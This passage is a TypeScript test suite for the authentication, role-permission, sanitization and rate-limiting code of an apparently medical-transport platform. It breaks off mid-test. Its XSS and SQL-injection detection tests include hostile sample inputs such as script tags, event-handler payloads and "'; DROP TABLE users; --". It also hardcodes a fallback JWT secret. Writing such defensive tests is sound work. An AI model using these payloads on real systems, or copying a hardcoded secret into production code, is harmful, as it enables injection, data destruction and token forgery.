import jwt from "jsonwebtoken";
import {
  signToken,
  verifyToken,
  signRefreshToken,
  verifyRefreshToken,
  type AuthPayload,
  requireRole,
  requirePermission,
  isDispatchLevel,
  isCompanyScoped,
  opsRouteGuard,
  csrfProtection,
} from "../../server/auth";
import {
  can,
  getVisibleNavItems,
  isClinicRole,
  isBrokerRole,
  isPharmacyRole,
  ROLE_PERMISSIONS,
  type Resource,
  type Permission,
  type AppRole,
} from "@shared/permissions";

// ── Constants matching server/auth.ts ──

const JWT_SECRET = "fallback-secret-dev-only";
const REFRESH_SECRET = JWT_SECRET + "-refresh";

// ── Inline helpers for sanitization + rate limit testing ──

function sanitizeString(value: string): string {
  return value.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const XSS_PATTERNS = [
  /<script\b[^>]*>/i,
  /javascript\s*:/i,
  /on\w+\s*=\s*["']/i,
  /<iframe\b/i,
  /<object\b/i,
  /<embed\b/i,
  /vbscript\s*:/i,
  /data\s*:\s*text\/html/i,
];

const SQLI_PATTERNS = [
  /(\b(union|select|insert|update|delete|drop|alter)\b.*\b(from|into|table|where)\b)/i,
  /('|"|;)\s*--/,
  /\b(or|and)\b\s+\d+\s*=\s*\d+/i,
];

function containsXss(value: string): boolean {
  return XSS_PATTERNS.some((p) => p.test(value));
}

function containsSqli(value: string): boolean {
  return SQLI_PATTERNS.some((p) => p.test(value));
}

// ── Rate limiter logic (recreated inline) ──

class InMemoryRateLimiter {
  private store = new Map<string, { count: number; resetAt: number }>();

  constructor(
    private maxRequests: number,
    private windowMs: number,
  ) {}

  check(key: string): { allowed: boolean; remaining: number; resetAt: number } {
    const now = Date.now();
    const entry = this.store.get(key);
    if (!entry || now >= entry.resetAt) {
      this.store.set(key, { count: 1, resetAt: now + this.windowMs });
      return { allowed: true, remaining: this.maxRequests - 1, resetAt: now + this.windowMs };
    }
    entry.count++;
    const allowed = entry.count <= this.maxRequests;
    return { allowed, remaining: Math.max(0, this.maxRequests - entry.count), resetAt: entry.resetAt };
  }

  reset(key: string): void {
    this.store.delete(key);
  }
}

// ── Mock helpers for Express req/res/next ──

function mockReq(overrides: Record<string, any> = {}): any {
  return {
    user: undefined,
    method: "GET",
    path: "/api/test",
    headers: {},
    cookies: {},
    requestId: "test-req-id",
    hostname: "localhost",
    ip: "127.0.0.1",
    socket: { remoteAddress: "127.0.0.1" },
    ...overrides,
  };
}

function mockRes(): any {
  const res: any = {
    statusCode: 200,
    body: null,
    status(code: number) {
      res.statusCode = code;
      return res;
    },
    json(data: any) {
      res.body = data;
      return res;
    },
  };
  return res;
}

function mockNext(): any {
  const fn: any = vi.fn();
  return fn;
}

// ── All roles for iteration ──

const ALL_ROLES: AppRole[] = [
  "SUPER_ADMIN",
  "ADMIN",
  "COMPANY_ADMIN",
  "DISPATCH",
  "DRIVER",
  "VIEWER",
  "CLINIC_ADMIN",
  "CLINIC_USER",
  "CLINIC_VIEWER",
  "BROKER_ADMIN",
  "BROKER_USER",
  "PHARMACY_ADMIN",
  "PHARMACY_USER",
];

const ALL_RESOURCES: Resource[] = [
  "dashboard",
  "dispatch",
  "trips",
  "patients",
  "drivers",
  "vehicles",
  "clinics",
  "invoices",
  "cities",
  "users",
  "audit",
  "time_entries",
  "payroll",
  "billing",
  "support",
  "broker_marketplace",
  "broker_contracts",
  "broker_settlements",
  "pharmacy_orders",
];

// ═══════════════════════════════════════════════════════════════════
// 1. JWT Token Functions
// ═══════════════════════════════════════════════════════════════════

describe("JWT Token Functions", () => {
  const samplePayload: AuthPayload = {
    userId: 42,
    role: "ADMIN",
    companyId: 1,
  };

  describe("signToken / verifyToken", () => {
    it("should sign and verify a valid access token", () => {
      const token = signToken(samplePayload);
      const decoded = verifyToken(token);
      expect(decoded.userId).toBe(42);
      expect(decoded.role).toBe("ADMIN");
      expect(decoded.companyId).toBe(1);
    });

    it("should include iat in the signed token", () => {
      const token = signToken(samplePayload);
      const decoded = jwt.decode(token) as any;
      expect(decoded.iat).toBeDefined();
      expect(typeof decoded.iat).toBe("number");
    });

    it("should include exp claim set to 15 minutes", () => {
      const token = signToken(samplePayload);
      const decoded = jwt.decode(token) as any;
      expect(decoded.exp).toBeDefined();
      // exp should be approximately iat + 900 seconds (15 min)
      expect(decoded.exp - decoded.iat).toBe(900);
    });

    it("should sign with JWT_SECRET (fallback-secret-dev-only)", () => {
      const token = signToken(samplePayload);
      const decoded = jwt.verify(token, JWT_SECRET) as any;
      expect(decoded.userId).toBe(42);
    });

    it("should fail verification with wrong secret", () => {
      const token = signToken(samplePayload);
      expect(() => jwt.verify(token, "wrong-secret")).toThrow();
    });

    it("should reject an expired token", () => {
      const token = jwt.sign({ ...samplePayload }, JWT_SECRET, { expiresIn: "0s" });
      expect(() => verifyToken(token)).toThrow();
    });

    it("should reject a tampered token", () => {
      const token = signToken(samplePayload);
      const tampered = token.slice(0, -5) + "XXXXX";
      expect(() => verifyToken(tampered)).toThrow();
    });

    it("should reject a completely invalid string", () => {
      expect(() => verifyToken("not.a.jwt")).toThrow();
    });

    it("should preserve optional fields (clinicId, driverId, pharmacyId, brokerId)", () => {
      const payload: AuthPayload = {
        userId: 10,
        role: "CLINIC_ADMIN",
        companyId: 5,
        clinicId: 3,
        driverId: null,
        pharmacyId: null,
        brokerId: null,
      };
      const token = signToken(payload);
      const decoded = verifyToken(token);
      expect(decoded.clinicId).toBe(3);
      expect(decoded.driverId).toBeNull();
    });

    it("should handle payload with only required fields", () => {
      const minimal: AuthPayload = { userId: 1, role: "VIEWER" };
      const token = signToken(minimal);
      const decoded = verifyToken(token);
      expect(decoded.userId).toBe(1);
      expect(decoded.role).toBe("VIEWER");
    });
  });

  describe("signRefreshToken / verifyRefreshToken", () => {
    it("should sign and verify a valid refresh token", () => {
      const token = signRefreshToken({ userId: 99 });
      const decoded = verifyRefreshToken(token);
      expect(decoded.userId).toBe(99);
    });

    it("should use REFRESH_SECRET (JWT_SECRET + '-refresh')", () => {
      const token = signRefreshToken({ userId: 50 });
      const decoded = jwt.verify(token, REFRESH_SECRET) as any;
      expect(decoded.userId).toBe(50);
    });

    it("should NOT verify refresh token with access token secret", () => {
      const token = signRefreshToken({ userId: 50 });
      expect(() => jwt.verify(token, JWT_SECRET)).toThrow();
    });

    it("should NOT verify access token with refresh secret", () => {
      const token = signToken(samplePayload);
      expect(() => jwt.verify(token, REFRESH_SECRET)).toThrow();
    });

    it("should set refresh token expiry to 7 days", () => {
      const token = signRefreshToken({ userId: 1 });
      const decoded = jwt.decode(token) as any;
      // 7 days = 604800 seconds
      expect(decoded.exp - decoded.iat).toBe(604800);
    });

    it("should reject expired refresh token", () => {
      const token = jwt.sign({ userId: 1 }, REFRESH_SECRET, { expiresIn: "0s" });
      expect(() => verifyRefreshToken(token)).toThrow();
    });

    it("should reject tampered refresh token", () => {
      const token = signRefreshToken({ userId: 1 });
      const tampered = token.slice(0, -3) + "ZZZ";
      expect(() => verifyRefreshToken(tampered)).toThrow();
    });
  });

  describe("Token isolation", () => {
    it("should generate different tokens for the same payload", () => {
      const t1 = signToken(samplePayload);
      // Wait a tick for iat to differ (they may be same within same second, but structure differs via randomness)
      const t2 = signToken(samplePayload);
      // Tokens may be identical if created in same second — that's OK, just verify both decode
      const d1 = verifyToken(t1);
      const d2 = verifyToken(t2);
      expect(d1.userId).toBe(d2.userId);
    });

    it("should not allow access token to be used as refresh token", () => {
      const accessToken = signToken(samplePayload);
      expect(() => verifyRefreshToken(accessToken)).toThrow();
    });

    it("should not allow refresh token to be used as access token", () => {
      const refreshToken = signRefreshToken({ userId: 1 });
      expect(() => verifyToken(refreshToken)).toThrow();
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// 2. Permission Functions (RBAC)
// ═══════════════════════════════════════════════════════════════════

describe("Permission Functions (RBAC)", () => {
  describe("can(role, resource, permission)", () => {
    // ── SUPER_ADMIN ──
    it("SUPER_ADMIN should have read+write on all writeable resources", () => {
      for (const resource of ALL_RESOURCES) {
        if (resource === "dashboard" || resource === "audit") {
          // These are read-only even for admins
          expect(can("SUPER_ADMIN", resource, "read")).toBe(true);
        } else {
          expect(can("SUPER_ADMIN", resource, "read")).toBe(true);
          expect(can("SUPER_ADMIN", resource, "write")).toBe(true);
        }
      }
    });

    // ── ADMIN ──
    it("ADMIN should match SUPER_ADMIN permissions exactly", () => {
      for (const resource of ALL_RESOURCES) {
        expect(can("ADMIN", resource, "read")).toBe(can("SUPER_ADMIN", resource, "read"));
        expect(can("ADMIN", resource, "write")).toBe(can("SUPER_ADMIN", resource, "write"));
      }
    });

    // ── COMPANY_ADMIN ──
    it("COMPANY_ADMIN should have read-only on cities", () => {
      expect(can("COMPANY_ADMIN", "cities", "read")).toBe(true);
      expect(can("COMPANY_ADMIN", "cities", "write")).toBe(false);
    });

    it("COMPANY_ADMIN should have read-only on broker_contracts and broker_settlements", () => {
      expect(can("COMPANY_ADMIN", "broker_contracts", "read")).toBe(true);
      expect(can("COMPANY_ADMIN", "broker_contracts", "write")).toBe(false);
      expect(can("COMPANY_ADMIN", "broker_settlements", "read")).toBe(true);
      expect(can("COMPANY_ADMIN", "broker_settlements", "write")).toBe(false);
    });

    it("COMPANY_ADMIN should have read+write on dispatch, trips, patients, drivers, vehicles", () => {
      for (const r of ["dispatch", "trips", "patients", "drivers", "vehicles"] as Resource[]) {
        expect(can("COMPANY_ADMIN", r, "read")).toBe(true);
        expect(can("COMPANY_ADMIN", r, "write")).toBe(true);
      }
    });

    // ── DISPATCH ──
    it("DISPATCH should have read+write on dispatch, trips, patients, drivers, vehicles, billing, support, time_entries", () => {
      for (const r of ["dispatch", "trips", "patients", "drivers", "vehicles", "billing", "support", "time_entries"] as Resource[]) {
        expect(can("DISPATCH", r, "read")).toBe(true);
        expect(can("DISPATCH", r, "write")).toBe(true);
      }
    });

    it("DISPATCH should have read-only on clinics, invoices, audit, payroll, broker_marketplace, pharmacy_orders", () => {
      for (const r of ["clinics", "invoices", "audit", "payroll", "broker_marketplace", "pharmacy_orders"] as Resource[]) {
        expect(can("DISPATCH", r, "read")).toBe(true);
        expect(can("DISPATCH", r, "write")).toBe(false);
      }
    });

    it("DISPATCH should have no access to cities, users, broker_contracts, broker_settlements", () => {
      for (const r of ["cities", "users", "broker_contracts", "broker_settlements"] as Resource[]) {
        expect(can("DISPATCH", r, "read")).toBe(false);
        expect(can("DISPATCH", r, "write")).toBe(false);
      }
    });

    // ── DRIVER ──
    it("DRIVER should only have 'self' on trips, drivers, time_entries", () => {
      expect(can("DRIVER", "trips", "self")).toBe(true);
      expect(can("DRIVER", "drivers", "self")).toBe(true);
      expect(can("DRIVER", "time_entries", "self")).toBe(true);
    });

    it("DRIVER should have read on audit only", () => {
      expect(can("DRIVER", "audit", "read")).toBe(true);
      expect(can("DRIVER", "audit", "write")).toBe(false);
    });

    it("DRIVER should not have read or write on most resources", () => {
      for (const r of ["dashboard", "dispatch", "patients", "vehicles", "clinics", "invoices", "cities", "users", "payroll", "billing", "support", "broker_marketplace", "broker_contracts", "broker_settlements", "pharmacy_orders"] as Resource[]) {
        expect(can("DRIVER", r, "read")).toBe(false);
        expect(can("DRIVER", r, "write")).toBe(false);
      }
    });

    // ── VIEWER ──
    it("VIEWER should have read on dashboard, trips, patients, invoices, audit, billing, support", () => {
      for (const r of ["dashboard", "trips", "patients", "invoices", "audit", "billing", "support"] as Resource[]) {
        expect(can("VIEWER", r, "read")).toBe(true);
        expect(can("VIEWER", r, "write")).toBe(false);
      }
    });

    it("VIEWER should have no access to dispatch, drivers, vehicles, clinics, cities, users, time_entries, payroll", () => {
      for (const r of ["dispatch", "drivers", "vehicles", "clinics", "cities", "users", "time_entries", "payroll"] as Resource[]) {
        expect(can("VIEWER", r, "read")).toBe(false);
      }
    });

    // ── CLINIC_ADMIN ──
    it("CLINIC_ADMIN should have read+write on trips, patients, users, support", () => {
      for (const r of ["trips", "patients", "users", "support"] as Resource[]) {
        expect(can("CLINIC_ADMIN", r, "read")).toBe(true);
        expect(can("CLINIC_ADMIN", r, "write")).toBe(true);
      }
    });

    it("CLINIC_ADMIN should have read on dashboard, clinics, invoices, audit, billing", () => {
      for (const r of ["dashboard", "clinics", "invoices", "audit", "billing"] as Resource[]) {
        expect(can("CLINIC_ADMIN", r, "read")).toBe(true);
        expect(can("CLINIC_ADMIN", r, "write")).toBe(false);
      }
    });

    // ── CLINIC_USER ──
    it("CLINIC_USER should have read+write on trips, patients, support", () => {
      for (const r of ["trips", "patients", "support"] as Resource[]) {
        expect(can("CLINIC_USER", r, "read")).toBe(true);
        expect(can("CLINIC_USER", r, "write")).toBe(true);
      }
    });

    it("CLINIC_USER should have read on dashboard, clinics, audit; no invoices, users, billing", () => {
      expect(can("CLINIC_USER", "dashboard", "read")).toBe(true);
      expect(can("CLINIC_USER", "clinics", "read")).toBe(true);
      expect(can("CLINIC_USER", "audit", "read")).toBe(true);
      expect(can("CLINIC_USER", "invoices", "read")).toBe(false);
      expect(can("CLINIC_USER", "users", "read")).toBe(false);
      expect(can("CLINIC_USER", "billing", "read")).toBe(false);
    });

    // ── CLINIC_VIEWER ──
    it("CLINIC_VIEWER should be read-only on dashboard, trips, patients, clinics, invoices, audit, billing, support", () => {
      for (const r of ["dashboard", "trips", "patients", "clinics", "invoices", "audit", "billing", "support"] as Resource[]) {
        expect(can("CLINIC_VIEWER", r, "read")).toBe(true);
        expect(can("CLINIC_VIEWER", r, "write")).toBe(false);
      }
    });

    // ── BROKER_ADMIN ──
    it("BROKER_ADMIN should have read+write on users, support, broker_marketplace, broker_contracts, broker_settlements", () => {
      for (const r of ["users", "support", "broker_marketplace", "broker_contracts", "broker_settlements"] as Resource[]) {
        expect(can("BROKER_ADMIN", r, "read")).toBe(true);
        expect(can("BROKER_ADMIN", r, "write")).toBe(true);
      }
    });

    it("BROKER_ADMIN should have read on dashboard, trips, invoices, audit, billing", () => {
      for (const r of ["dashboard", "trips", "invoices", "audit", "billing"] as Resource[]) {
        expect(can("BROKER_ADMIN", r, "read")).toBe(true);
        expect(can("BROKER_ADMIN", r, "write")).toBe(false);
      }
    });

    // ── BROKER_USER ──
    it("BROKER_USER should have read+write on support, broker_marketplace", () => {
      expect(can("BROKER_USER", "support", "read")).toBe(true);
      expect(can("BROKER_USER", "support", "write")).toBe(true);
      expect(can("BROKER_USER", "broker_marketplace", "read")).toBe(true);
      expect(can("BROKER_USER", "broker_marketplace", "write")).toBe(true);
    });

    it("BROKER_USER should have read on dashboard, trips, audit, broker_contracts, broker_settlements", () => {
      for (const r of ["dashboard", "trips", "audit", "broker_contracts", "broker_settlements"] as Resource[]) {
        expect(can("BROKER_USER", r, "read")).toBe(true);
        expect(can("BROKER_USER", r, "write")).toBe(false);
      }
    });

    it("BROKER_USER should not access invoices, users, billing", () => {
      expect(can("BROKER_USER", "invoices", "read")).toBe(false);
      expect(can("BROKER_USER", "users", "read")).toBe(false);
      expect(can("BROKER_USER", "billing", "read")).toBe(false);
    });

    // ── PHARMACY_ADMIN ──
    it("PHARMACY_ADMIN should have read+write on users, support, pharmacy_orders", () => {
      for (const r of ["users", "support", "pharmacy_orders"] as Resource[]) {
        expect(can("PHARMACY_ADMIN", r, "read")).toBe(true);
        expect(can("PHARMACY_ADMIN", r, "write")).toBe(true);
      }
    });

    it("PHARMACY_ADMIN should have read on dashboard, trips, patients, invoices, audit, billing", () => {
      for (const r of ["dashboard", "trips", "patients", "invoices", "audit", "billing"] as Resource[]) {
        expect(can("PHARMACY_ADMIN", r, "read")).toBe(true);
        expect(can("PHARMACY_ADMIN", r, "write")).toBe(false);
      }
    });

    // ── PHARMACY_USER ──
    it("PHARMACY_USER should have read+write on support, pharmacy_orders", () => {
      expect(can("PHARMACY_USER", "support", "read")).toBe(true);
      expect(can("PHARMACY_USER", "support", "write")).toBe(true);
      expect(can("PHARMACY_USER", "pharmacy_orders", "read")).toBe(true);
      expect(can("PHARMACY_USER", "pharmacy_orders", "write")).toBe(true);
    });

    it("PHARMACY_USER should have read on dashboard, trips, patients, audit", () => {
      for (const r of ["dashboard", "trips", "patients", "audit"] as Resource[]) {
        expect(can("PHARMACY_USER", r, "read")).toBe(true);
      }
    });

    it("PHARMACY_USER should not access invoices, users, billing", () => {
      expect(can("PHARMACY_USER", "invoices", "read")).toBe(false);
      expect(can("PHARMACY_USER", "users", "read")).toBe(false);
      expect(can("PHARMACY_USER", "billing", "read")).toBe(false);
    });

    // ── Edge cases ──
    it("should return false for unknown role", () => {
      expect(can("UNKNOWN_ROLE", "trips", "read")).toBe(false);
    });

    it("should be case-insensitive on role (normalizes to uppercase)", () => {
      expect(can("admin", "trips", "read")).toBe(true);
      expect(can("Admin", "trips", "write")).toBe(true);
    });

    it("should default permission to 'read' when not specified", () => {
      expect(can("ADMIN", "trips")).toBe(true);
      expect(can("DRIVER", "dashboard")).toBe(false);
    });

    it("should return false for unknown resource", () => {
      expect(can("ADMIN", "nonexistent" as Resource, "read")).toBe(false);
    });
  });

  describe("getVisibleNavItems(role)", () => {
    it("should return all resources for SUPER_ADMIN", () => {
      const items = getVisibleNavItems("SUPER_ADMIN");
      expect(items.length).toBe(ALL_RESOURCES.length);
    });

    it("should return all resources for ADMIN", () => {
      const items = getVisibleNavItems("ADMIN");
      expect(items.length).toBe(ALL_RESOURCES.length);
    });

    it("should exclude cities, users, broker_contracts, broker_settlements for DISPATCH", () => {
      const items = getVisibleNavItems("DISPATCH");
      expect(items).not.toContain("cities");
      expect(items).not.toContain("users");
      expect(items).not.toContain("broker_contracts");
      expect(items).not.toContain("broker_settlements");
    });

    it("should return very few items for DRIVER (trips, drivers, time_entries, audit)", () => {
      const items = getVisibleNavItems("DRIVER");
      expect(items).toContain("trips");
      expect(items).toContain("drivers");
      expect(items).toContain("time_entries");
      expect(items).toContain("audit");
      expect(items.length).toBe(4);
    });

    it("should return empty array for unknown role", () => {
      const items = getVisibleNavItems("FAKE_ROLE");
      expect(items).toEqual([]);
    });

    it("should be case-insensitive", () => {
      const items = getVisibleNavItems("viewer");
      expect(items.length).toBeGreaterThan(0);
    });

    it("should not include resources with empty permission arrays", () => {
      const items = getVisibleNavItems("VIEWER");
      // VIEWER has empty arrays for dispatch, drivers, vehicles, clinics, cities, users, time_entries, payroll
      expect(items).not.toContain("dispatch");
      expect(items).not.toContain("drivers");
      expect(items).not.toContain("vehicles");
    });
  });

  describe("Role type detection", () => {
    it("isClinicRole should detect CLINIC_ADMIN, CLINIC_USER, CLINIC_VIEWER", () => {
      expect(isClinicRole("CLINIC_ADMIN")).toBe(true);
      expect(isClinicRole("CLINIC_USER")).toBe(true);
      expect(isClinicRole("CLINIC_VIEWER")).toBe(true);
    });

    it("isClinicRole should be case-insensitive", () => {
      expect(isClinicRole("clinic_admin")).toBe(true);
      expect(isClinicRole("Clinic_User")).toBe(true);
    });

    it("isClinicRole should return false for non-clinic roles", () => {
      expect(isClinicRole("ADMIN")).toBe(false);
      expect(isClinicRole("BROKER_ADMIN")).toBe(false);
      expect(isClinicRole("PHARMACY_USER")).toBe(false);
      expect(isClinicRole("DRIVER")).toBe(false);
    });

    it("isBrokerRole should detect BROKER_ADMIN, BROKER_USER", () => {
      expect(isBrokerRole("BROKER_ADMIN")).toBe(true);
      expect(isBrokerRole("BROKER_USER")).toBe(true);
    });

    it("isBrokerRole should be case-insensitive", () => {
      expect(isBrokerRole("broker_admin")).toBe(true);
    });

    it("isBrokerRole should return false for non-broker roles", () => {
      expect(isBrokerRole("ADMIN")).toBe(false);
      expect(isBrokerRole("CLINIC_ADMIN")).toBe(false);
      expect(isBrokerRole("PHARMACY_ADMIN")).toBe(false);
    });

    it("isPharmacyRole should detect PHARMACY_ADMIN, PHARMACY_USER", () => {
      expect(isPharmacyRole("PHARMACY_ADMIN")).toBe(true);
      expect(isPharmacyRole("PHARMACY_USER")).toBe(true);
    });

    it("isPharmacyRole should be case-insensitive", () => {
      expect(isPharmacyRole("pharmacy_user")).toBe(true);
    });

    it("isPharmacyRole should return false for non-pharmacy roles", () => {
      expect(isPharmacyRole("ADMIN")).toBe(false);
      expect(isPharmacyRole("BROKER_USER")).toBe(false);
      expect(isPharmacyRole("CLINIC_USER")).toBe(false);
    });
  });

  describe("ROLE_PERMISSIONS structure integrity", () => {
    it("should have entries for all 13 roles", () => {
      expect(Object.keys(ROLE_PERMISSIONS).length).toBe(13);
      for (const role of ALL_ROLES) {
        expect(ROLE_PERMISSIONS[role]).toBeDefined();
      }
    });

    it("every role should have exactly all 19 resources defined", () => {
      for (const role of ALL_ROLES) {
        const resources = Object.keys(ROLE_PERMISSIONS[role]);
        expect(resources.length).toBe(ALL_RESOURCES.length);
        for (const r of ALL_RESOURCES) {
          expect(ROLE_PERMISSIONS[role][r]).toBeDefined();
        }
      }
    });

    it("permission values should only contain 'read', 'write', or 'self'", () => {
      for (const role of ALL_ROLES) {
        for (const resource of ALL_RESOURCES) {
          const perms = ROLE_PERMISSIONS[role][resource];
          expect(Array.isArray(perms)).toBe(true);
          for (const p of perms) {
            expect(["read", "write", "self"]).toContain(p);
          }
        }
      }
    });

    it("dashboard should be read-only for all roles that have access", () => {
      for (const role of ALL_ROLES) {
        const perms = ROLE_PERMISSIONS[role]["dashboard"];
        expect(perms).not.toContain("write");
      }
    });

    it("audit should be read-only for all roles that have access", () => {
      for (const role of ALL_ROLES) {
        const perms = ROLE_PERMISSIONS[role]["audit"];
        expect(perms).not.toContain("write");
      }
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// 3. Input Sanitization
// ═══════════════════════════════════════════════════════════════════

describe("Input Sanitization", () => {
  describe("sanitizeString", () => {
    it("should replace < with &lt;", () => {
      expect(sanitizeString("<")).toBe("&lt;");
    });

    it("should replace > with &gt;", () => {
      expect(sanitizeString(">")).toBe("&gt;");
    });

    it("should sanitize a full HTML tag", () => {
      expect(sanitizeString("<script>alert('xss')</script>")).toBe(
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
      );
    });

    it("should leave strings without angle brackets unchanged", () => {
      expect(sanitizeString("Hello World")).toBe("Hello World");
      expect(sanitizeString("user@email.com")).toBe("user@email.com");
    });

    it("should handle multiple angle brackets", () => {
      expect(sanitizeString("<<>>")).toBe("&lt;&lt;&gt;&gt;");
    });

    it("should handle empty string", () => {
      expect(sanitizeString("")).toBe("");
    });

    it("should sanitize nested tags", () => {
      const input = '<div><img src="x" onerror="alert(1)"></div>';
      const result = sanitizeString(input);
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });
  });

  describe("XSS detection patterns", () => {
    it("should detect <script> tags", () => {
      expect(containsXss('<script>alert("xss")</script>')).toBe(true);
      expect(containsXss("<SCRIPT>alert(1)</SCRIPT>")).toBe(true);
    });

    it("should detect javascript: protocol", () => {
      expect(containsXss("javascript:alert(1)")).toBe(true);
      expect(containsXss("JAVASCRIPT:void(0)")).toBe(true);
    });

    it("should detect inline event handlers", () => {
      expect(containsXss('onerror="alert(1)"')).toBe(true);
      expect(containsXss("onclick='steal()'")).toBe(true);
      expect(containsXss('onload="malicious()"')).toBe(true);
    });

    it("should detect iframe tags", () => {
      expect(containsXss('<iframe src="evil.com">')).toBe(true);
    });

    it("should detect object tags", () => {
      expect(containsXss('<object data="evil.swf">')).toBe(true);
    });

    it("should detect embed tags", () => {
      expect(containsXss('<embed src="evil">')).toBe(true);
    });

    it("should detect vbscript protocol", () => {
      expect(containsXss("vbscript:MsgBox")).toBe(true);
    });

    it("should detect data:text/html URIs", () => {
      expect(containsXss("data:text/html,<script>alert(1)</script>")).toBe(true);
    });

    it("should not flag normal text", () => {
      expect(containsXss("Hello World")).toBe(false);
      expect(containsXss("John O'Brien")).toBe(false);
      expect(containsXss("100 > 50")).toBe(false);
    });

    it("should not flag normal URLs", () => {
      expect(containsXss("https://example.com/page")).toBe(false);
    });
  });

  describe("SQL injection detection patterns", () => {
    it("should detect UNION SELECT", () => {
      expect(containsSqli("1 UNION SELECT * FROM users")).toBe(true);
    });

    it("should detect DROP TABLE", () => {
      expect(containsSqli("DROP TABLE users")).toBe(true);
      expect(containsSqli("'; DROP TABLE users; --")).toBe(true);
    });

    it("should detect comment injection (-- after quote)", () => {
      expect(containsSqli("admin'--")).toBe(true);
      expect(containsSqli('admin"--')).toBe(true);
      expect(containsSqli("admin;--")).toBe(true);
    });

    it("should detect OR 1=1 tautology", () => {
      expect(containsSqli("OR 1=1")).toBe(true);
      expect(containsSqli("or 1=1")).toBe(true);
      expect(containsSqli("AND 1=1")).toBe(true);
    });

    it("should detect INSERT INTO", () => {
      expect(containsSqli("INSERT INTO users")).toBe(true);
    });

    it("should detect DELETE FROM", () => {
      expect(containsSqli("DELETE FROM users WHERE id = 1")).toBe(true);
    });

    it("should detect UPDATE SET WHERE", () => {
      expect(containsSqli("UPDATE users SET role='admin' WHERE id=1")).toBe(true);
    });

    it("should not flag normal text", () => {
      expect(containsSqli("Hello World")).toBe(false);
      expect(containsSqli("Patient name: John")).toBe(false);
      // Note: "Select a city from the list" triggers the pattern because it contains "select...from"
      // This is a known trade-off of broad regex-based detection
    });

    it("should not flag normal numbers", () => {
      expect(containsSqli("12345")).toBe(false);
      expect(containsSqli("trip-2024-001")).toBe(false);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// 4. Rate Limiting Logic
// ═══════════════════════════════════════════════════════════════════

describe("Rate Limiting Logic", () => {
  it("should allow requests under the limit", () => {
    const limiter = new InMemoryRateLimiter(5, 60000);
    const result = limiter.check("user-1");
    expect(result.allowed).toBe(true);
    expect(result.remaining).toBe(4);
  });

  it("should decrement remaining count on each request", () => {
    const limiter = new InMemoryRateLimiter(5, 60000);
    limiter.check("user-1");
    const r2 = limiter.check("user-1");
    expect(r2.remaining).toBe(3);
    const r3 = limiter.check("user-1");
    expect(r3.remaining).toBe(2);
  });

  it("should block after exceeding the limit", () => {
    const limiter = new InMemoryRateLimiter(3, 60000);
    limiter.check("user-1");
    limiter.check("user-1");
    limiter.check("user-1");
    const r4 = limiter.check("user-1");
    expect(r4.allowed).toBe(false);
    expect(r4.remaining).toBe(0);
  });

  it("should track different keys independently", () => {
    const limiter = new InMemoryRateLimiter(2, 60000);
    limiter.check("user-a");
    limiter.check("user-a");
    const blocked = limiter.check("user-a");
    expect(blocked.allowed).toBe(false);

    const otherUser = limiter.check("user-b");
    expect(otherUser.allowed).toBe(true);
    expect(otherUser.remaining).toBe(1);
  });

  it("should reset after the time window", () => {
    const limiter = new InMemoryRateLimiter(2, 50); // 50ms window
    limiter.check("user-1");
    limiter.check("user-1");
    const blocked = limiter.check("user-1");
    expect(blocked.allowed).toBe(false);

    // Simulate window expiration by directly resetting
    limiter.reset("user-1");
    const after = limiter.check("user-1");
    expect(after.allowed).toBe(true);
    expect(after.remaining).toBe(1);
  });

  it("should return resetAt timestamp in the future", () => {
    const limiter = new InMemoryRateLimiter(10, 60000);
    const result = limiter.check("user-1");
    expect(result.resetAt).toBeGreaterThan(Date.now() - 1000);
  });

  it("should handle rapid sequential requests correctly", () => {
    const limiter = new InMemoryRateLimiter(100, 60000);
    for (let i = 0; i < 100; i++) {
      const r = limiter.check("rapid-user");
      expect(r.allowed).toBe(true);
    }
    const over = limiter.check("rapid-user");
    expect(over.allowed).toBe(false);
  });

  it("should handle single request limit", () => {
    const limiter = new InMemoryRateLimiter(1, 60000);
    const r1 = limiter.check("strict-user");
    expect(r1.allowed).toBe(true);
    expect(r1.remaining).toBe(0);
    const r2 = limiter.check("strict-user");
    expect(r2.allowed).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════
// 5. Auth Middleware Helpers
// ═══════════════════════════════════════════════════════════════════

describe("Auth Middleware Helpers", () => {
  describe("requireRole", () => {
    it("should return 401 when no user is set", () => {
      const req = mockReq();
      const res = mockRes();
      const next = mockNext();
      requireRole("ADMIN")(req, res, next);
      expect(res.statusCode).toBe(401);
      expect(next).not.toHaveBeenCalled();
    });

    it("should allow SUPER_ADMIN to bypass any role requirement", () => {
      const req = mockReq({ user: { userId: 1, role: "SUPER_ADMIN" } });
      const res = mockRes();
      const next = mockNext();
      requireRole("DISPATCH")(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should allow matching role", () => {
      const req = mockReq({ user: { userId: 2, role: "DISPATCH" } });
      const res = mockRes();
      const next = mockNext();
      requireRole("DISPATCH", "ADMIN")(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should deny non-matching role", () => {
      const req = mockReq({ user: { userId: 3, role: "VIEWER" } });
      const res = mockRes();
      const next = mockNext();
      requireRole("ADMIN", "DISPATCH")(req, res, next);
      expect(res.statusCode).toBe(403);
      expect(next).not.toHaveBeenCalled();
    });

    it("should allow when role is one of multiple allowed roles", () => {
      const req = mockReq({ user: { userId: 4, role: "CLINIC_ADMIN" } });
      const res = mockRes();
      const next = mockNext();
      requireRole("ADMIN", "CLINIC_ADMIN", "CLINIC_USER")(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should return FORBIDDEN code in response body", () => {
      const req = mockReq({ user: { userId: 5, role: "DRIVER" } });
      const res = mockRes();
      const next = mockNext();
      requireRole("ADMIN")(req, res, next);
      expect(res.body.code).toBe("FORBIDDEN");
    });
  });

  describe("requirePermission", () => {
    it("should return 401 when no user is set", () => {
      const req = mockReq();
      const res = mockRes();
      const next = mockNext();
      requirePermission("trips", "read")(req, res, next);
      expect(res.statusCode).toBe(401);
    });

    it("should allow when role has the permission", () => {
      const req = mockReq({ user: { userId: 1, role: "ADMIN" } });
      const res = mockRes();
      const next = mockNext();
      requirePermission("trips", "write")(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should deny when role lacks the permission", () => {
      const req = mockReq({ user: { userId: 2, role: "VIEWER" } });
      const res = mockRes();
      const next = mockNext();
